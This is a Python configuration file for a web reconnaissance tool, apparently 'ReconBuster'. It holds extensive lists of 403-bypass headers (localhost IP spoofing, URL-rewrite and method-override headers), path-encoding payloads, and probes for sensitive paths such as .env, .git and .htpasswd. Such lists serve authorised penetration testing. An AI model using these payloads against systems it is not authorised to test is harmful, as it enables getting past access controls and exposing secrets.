"""
ReconBuster Configuration
Advanced Security Reconnaissance Tool
"""

import os
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from pathlib import Path

# Base directory
BASE_DIR = Path(__file__).parent.parent

@dataclass
class ScanConfig:
    """Main scan configuration"""
    target: str = ""
    threads: int = 50
    timeout: int = 10
    delay: float = 0.0
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    follow_redirects: bool = True
    verify_ssl: bool = False
    proxy: Optional[str] = None

    # Module toggles
    enable_subdomain: bool = True
    enable_directory: bool = True
    enable_bypass403: bool = True
    enable_vuln_scan: bool = True

    # Output
    output_dir: str = str(BASE_DIR / "reports")
    generate_pdf: bool = True

# User-Agent rotation list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

# 403 Bypass Headers - ULTRA COMPREHENSIVE list (300+ combinations)
BYPASS_HEADERS = [
    # ==================== IP SPOOFING HEADERS ====================
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-For": "127.0.0.1, 127.0.0.2"},
    {"X-Forwarded-For": "127.0.0.1:80"},
    {"X-Forwarded-For": "127.0.0.1:443"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Cluster-Client-IP": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"Forwarded-For": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;proto=http;by=127.0.0.1"},
    {"X-Forwarded": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"Fastly-Client-IP": "127.0.0.1"},
    {"X-Cluster-Client-IP": "127.0.0.1"},
    {"X-Azure-ClientIP": "127.0.0.1"},
    {"X-Backend-IP": "127.0.0.1"},
    {"X-Akamai-Client-IP": "127.0.0.1"},
    {"X-Sucuri-Clientip": "127.0.0.1"},

    # Alternative IP formats - Decimal
    {"X-Forwarded-For": "2130706433"},
    {"X-Client-IP": "2130706433"},
    {"X-Real-IP": "2130706433"},

    # Alternative IP formats - Hex
    {"X-Forwarded-For": "0x7F000001"},
    {"X-Forwarded-For": "0x7f.0x0.0x0.0x1"},
    {"X-Client-IP": "0x7F000001"},

    # Alternative IP formats - Octal
    {"X-Forwarded-For": "0177.0000.0000.0001"},
    {"X-Forwarded-For": "0177.0.0.1"},
    {"X-Client-IP": "0177.0.0.1"},

    # Shorthand localhost
    {"X-Forwarded-For": "127.1"},
    {"X-Forwarded-For": "127.0.1"},
    {"X-Forwarded-For": "127.000.000.001"},
    {"X-Forwarded-For": "0"},
    {"X-Forwarded-For": "0.0.0.0"},

    # Private IP ranges
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Forwarded-For": "10.0.0.0"},
    {"X-Forwarded-For": "172.16.0.1"},
    {"X-Forwarded-For": "192.168.1.1"},
    {"X-Forwarded-For": "192.168.0.1"},

    # IPv6 variations
    {"X-Forwarded-For": "::1"},
    {"X-Forwarded-For": "::ffff:127.0.0.1"},
    {"X-Forwarded-For": "0000::1"},
    {"X-Forwarded-For": "::ffff:7f00:1"},
    {"X-Forwarded-For": "fe80::1"},
    {"X-Forwarded-For": "[::1]"},
    {"X-Forwarded-For": "::127.0.0.1"},
    {"X-Originating-IP": "[::1]"},
    {"X-Remote-Addr": "::1"},
    {"True-Client-IP": "::1"},

    # ==================== HOST MANIPULATION ====================
    {"X-Host": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"Forwarded-Host": "127.0.0.1"},
    {"X-Forwarded-Server": "127.0.0.1"},
    {"X-Original-Host": "127.0.0.1"},
    {"X-HTTP-Host-Override": "127.0.0.1"},
    {"X-Backend-Host": "127.0.0.1"},
    {"Proxy-Host": "127.0.0.1"},

    # ==================== URL REWRITING ====================
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"X-Override-URL": "/"},
    {"X-HTTP-DestinationURL": "/"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-Path": "/"},
    {"X-Forwarded-Uri": "/"},
    {"Destination": "/"},
    {"Request-Uri": "/"},

    # ==================== PROTOCOL/SCHEME ====================
    {"X-Forwarded-Proto": "https"},
    {"X-Forwarded-Proto": "http"},
    {"X-Forwarded-Scheme": "https"},
    {"X-Forwarded-Port": "443"},
    {"X-Forwarded-Port": "80"},
    {"X-Forwarded-Port": "8080"},
    {"X-Forwarded-SSL": "on"},

    # ==================== METHOD OVERRIDE ====================
    {"X-HTTP-Method-Override": "GET"},
    {"X-HTTP-Method-Override": "PUT"},
    {"X-HTTP-Method-Override": "POST"},
    {"X-HTTP-Method-Override": "DELETE"},
    {"X-HTTP-Method-Override": "PATCH"},
    {"X-Method-Override": "GET"},
    {"X-HTTP-Method": "GET"},
    {"X-HTTP-Method": "PUT"},

    # ==================== SPECIAL HEADERS ====================
    {"X-Requested-With": "XMLHttpRequest"},
    {"Content-Length": "0"},
    {"X-Original-URL": "x]"},
    {"Referer": "/"},
    {"Origin": "http://127.0.0.1"},
    {"Accept": "application/json"},
    {"Content-Type": "application/json"},
    {"X-Debug": "1"},
    {"X-Debug-Token": "bypass"},
    {"X-Custom-Header": "bypass"},

    # ==================== PROXY HEADERS ====================
    {"Via": "1.1 localhost"},
    {"X-Via": "1.1 localhost"},
    {"Forwarded": "for=127.0.0.1;host=localhost;proto=https"},

    # ==================== COMBINATION HEADERS ====================
    {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1", "X-Client-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1", "X-Original-URL": "/"},
    {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "localhost"},
    {"CF-Connecting-IP": "127.0.0.1", "True-Client-IP": "127.0.0.1"},
]

# ==================== TRIM INCONSISTENCY PAYLOADS ====================
# These exploit whitespace handling differences between reverse proxy and app
TRIM_PAYLOADS = {
    "flask": ["%85", "%a0", "%1f", "%04"],  # Flask/Python trims these
    "nodejs": ["%0a", "%0d", "%0c", "%09", "%20"],  # Node.js/Express
    "spring": [";", ";.", ";/", "..;", ";.."],  # Spring Boot/Java
    "php": ["%00", "%0a", "%0d"],  # PHP
    "general": ["%20", "%09", "%0a", "%0b", "%0c", "%0d", "%a0"],
}

# ==================== IIS COOKIELESS SESSION ====================
IIS_COOKIELESS_TOKENS = [
    "(S(X))",
    "(A(X))",
    "(F(X))",
    "(S(X))/(A(Y))",
    "(S(lit3rally_telegraphy))",
    "(S(anything))",
    "(A(anything))",
    "(F(anything))",
]

# Path manipulation payloads for 403 bypass - ULTRA COMPREHENSIVE
PATH_BYPASSES = [
    # ==================== BASIC VARIATIONS ====================
    "/{path}",
    "/{path}/",
    "/{path}//",
    "//{path}",
    "//{path}//",
    "///{path}",
    "/{path}///",

    # ==================== DOT VARIATIONS ====================
    "/./{path}",
    "/{path}/.",
    "/{path}./",
    "/{path}/..",
    "/{path}/../{path}",
    "/./{path}/./",
    "/../{path}",
    "/..;/{path}",
    "/{path}/..;/",
    "/{path}..;/",
    "/{path};/",
    "/;/{path}",
    "/.;/{path}",
    "//;/{path}",
    "/.;./{path}",
    "/.;/./{path}",

    # ==================== WHITESPACE/SPECIAL ====================
    "/{path}%20",
    "/{path}%09",
    "/{path}%00",
    "/{path}%0a",
    "/{path}%0d",
    "/{path}%0d%0a",

    # ==================== QUERY STRING TRICKS ====================
    "/{path}?",
    "/{path}??",
    "/{path}???",
    "/{path}?anything",
    "/{path}?debug=1",
    "/{path}?.css",
    "/{path}?.js",
    "/{path}?.html",
    "/{path}?&",
    "/{path}?%00",
    "/{path}?%0a",

    # ==================== FRAGMENT/HASH TRICKS ====================
    "/{path}#",
    "/{path}#anything",
    "/{path}#.",
    "/{path}#/",
    "/{path}%23",
    "/{path}%23/",
    "/{path}%2523",

    # ==================== EXTENSION TRICKS ====================
    "/{path}.html",
    "/{path}.json",
    "/{path}.php",
    "/{path}.css",
    "/{path}.js",
    "/{path}.xml",
    "/{path}.asp",
    "/{path}.aspx",
    "/{path}.txt",
    "/{path}.pdf",
    "/{path}.png",
    "/{path}.ico",
    "/{path}....json",
    "/{path}%00.json",
    "/{path}/.json",
    "/{path}..json",
    "/{path}.randomext",

    # ==================== SINGLE URL ENCODING ====================
    "/%2e/{path}",
    "/%2e%2e/{path}",
    "/{path}%2f",
    "/{path}%2f/",
    "/%2e/{path}%2f",
    "/%2F{path}",
    "/{path}%2F",
    "/%2e%2e%2f{path}",
    "/%2e%2e/{path}",

    # ==================== DOUBLE URL ENCODING ====================
    "/%252e/{path}",
    "/%252e%252e/{path}",
    "/{path}%252f",
    "/{path}%252f/",
    "/%252e%252e%252f{path}",
    "/%252F{path}",
    "/{path}%252F",

    # ==================== TRIPLE URL ENCODING ====================
    "/%25252e/{path}",
    "/%25252e%25252e/{path}",
    "/{path}%25252f",

    # ==================== BACKSLASH VARIATIONS ====================
    "/..%5c{path}",
    "/{path}%5c",
    "/%5c{path}",
    "/..%255c{path}",
    "/{path}%5c..%5c",

    # ==================== NULL BYTE INJECTION ====================
    "/..%00/{path}",
    "/{path}%00",
    "/{path}%00.html",
    "/{path}%00.json",
    "/..%00%2f{path}",

    # ==================== SEMICOLON PATH PARAMS (Java) ====================
    "/{path};foo=bar",
    "/{path};/",
    "/{path};.css",
    "/{path};.js",
    "/{path};x=y",
    "/{path};a=b;c=d",
    "/;/{path}",
    "/;x=/{path}",
    "/.;/{path}",
    "/.;x=/{path}",

    # ==================== SPECIAL CHARACTERS ====================
    "/{path}~",
    "/{path}@",
    "/{path}*",
    "/{path}!",
    "/{path}$",
    "/{path}&",
    "/{path}+",
    "/{path}=",

    # ==================== UNICODE/UTF-8 TRICKS ====================
    "/%ef%bc%8f{path}",  # Fullwidth solidus
    "/%c0%af{path}",  # Overlong encoding
    "/%c0%2f{path}",  # Overlong
    "/%e0%80%af{path}",  # Overlong
    "/{path}%c0%af",
    "/%c1%1c{path}",
    "/%c1%9c{path}",

    # ==================== CASE MANIPULATION ====================
    "/{PATH}",  # Uppercase
    "/{Path}",  # Mixed case
    "/{pAtH}",  # SpongeBob case

    # ==================== IIS SPECIFIC ====================
    "/{path}.xxx",  # IIS ignores unknown extensions
    "/{path}::$DATA",  # NTFS ADS
    "/{path}::$INDEX_ALLOCATION",

    # ==================== MIXED PATTERNS ====================
    "/{path}/./",
    "//{path}/..",
    "/./{path}//",
    "/..//../{path}",
]

# ==================== UNICODE NORMALIZATION PAYLOADS ====================
UNICODE_PAYLOADS = {
    "/": ["%2f", "%252f", "%25252f", "%c0%af", "%e0%80%af", "%c0%2f", "%ef%bc%8f"],
    ".": ["%2e", "%252e", "%25252e", "%c0%ae"],
    ";": ["%3b", "%253b"],
}

# HTTP Methods to try for bypass - COMPREHENSIVE
HTTP_METHODS = [
    # Standard methods
    "GET", "POST", "PUT", "DELETE", "PATCH",
    "HEAD", "OPTIONS", "TRACE", "CONNECT",
    # WebDAV methods
    "PROPFIND", "PROPPATCH", "MKCOL", "COPY",
    "MOVE", "LOCK", "UNLOCK", "SEARCH",
    "REPORT", "MKACTIVITY", "CHECKOUT", "MERGE",
    "M-SEARCH", "NOTIFY", "SUBSCRIBE", "UNSUBSCRIBE",
    "PURGE", "LINK", "UNLINK", "ACL",
    # Less common WebDAV
    "BASELINE-CONTROL", "VERSION-CONTROL",
    "UNCHECKOUT", "MKWORKSPACE", "UPDATE", "LABEL",
    # Custom/Test methods
    "FOOBAR", "TEST", "DEBUG", "TRACK", "QUERY",
    # Case variations (sometimes bypass case-sensitive filters)
    "get", "Get", "gEt", "GeT",
    "post", "Post", "pOsT",
]

# Protocol variations
PROTOCOL_TRICKS = [
    {"version": "HTTP/1.0"},
    {"version": "HTTP/2"},
]

# Common directories to enumerate
DEFAULT_DIRECTORIES = [
    "admin", "administrator", "login", "dashboard", "panel",
    "api", "v1", "v2", "internal", "private", "secret",
    "backup", "backups", "config", "conf", "settings",
    "upload", "uploads", "files", "documents", "docs",
    "test", "testing", "dev", "development", "staging",
    "debug", "phpinfo", "server-status", "server-info",
    ".git", ".svn", ".env", ".htaccess", ".htpasswd",
    "wp-admin", "wp-content", "wp-includes",
    "phpmyadmin", "adminer", "manager", "console",
    "cgi-bin", "scripts", "includes", "inc",
    "assets", "static", "media", "images", "css", "js",
    "xmlrpc.php", "robots.txt", "sitemap.xml",
]

# Status codes
STATUS_SUCCESS = [200, 201, 202, 204]
STATUS_REDIRECT = [301, 302, 303, 307, 308]
STATUS_FORBIDDEN = [401, 403]
STATUS_NOT_FOUND = [404]
STATUS_SERVER_ERROR = [500, 501, 502, 503, 504]

# Colors for terminal output
COLORS = {
    "success": "\033[92m",      # Green
    "warning": "\033[93m",      # Yellow
    "error": "\033[91m",        # Red
    "info": "\033[94m",         # Blue
    "cyan": "\033[96m",         # Cyan
    "reset": "\033[0m",         # Reset
    "bold": "\033[1m",          # Bold
}

# Subdomain sources configuration
SUBDOMAIN_SOURCES = {
    "crtsh": {
        "url": "https://crt.sh/?q=%.{domain}&output=json",
        "type": "api",
        "enabled": True
    },
    "hackertarget": {
        "url": "https://api.hackertarget.com/hostsearch/?q={domain}",
        "type": "api",
        "enabled": True
    },
    "threatcrowd": {
        "url": "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain={domain}",
        "type": "api",
        "enabled": True
    },
    "alienvault": {
        "url": "https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns",
        "type": "api",
        "enabled": True
    },
    "urlscan": {
        "url": "https://urlscan.io/api/v1/search/?q=domain:{domain}",
        "type": "api",
        "enabled": True
    },
    "rapiddns": {
        "url": "https://rapiddns.io/subdomain/{domain}?full=1",
        "type": "scrape",
        "enabled": True
    },
    "bufferover": {
        "url": "https://dns.bufferover.run/dns?q=.{domain}",
        "type": "api",
        "enabled": True
    },
    "webarchive": {
        "url": "https://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&fl=original&collapse=urlkey",
        "type": "api",
        "enabled": True
    }
}

# Verification methods
VERIFICATION_METHODS = {
    "dns_resolve": True,
    "http_probe": True,
    "port_scan": False,
}
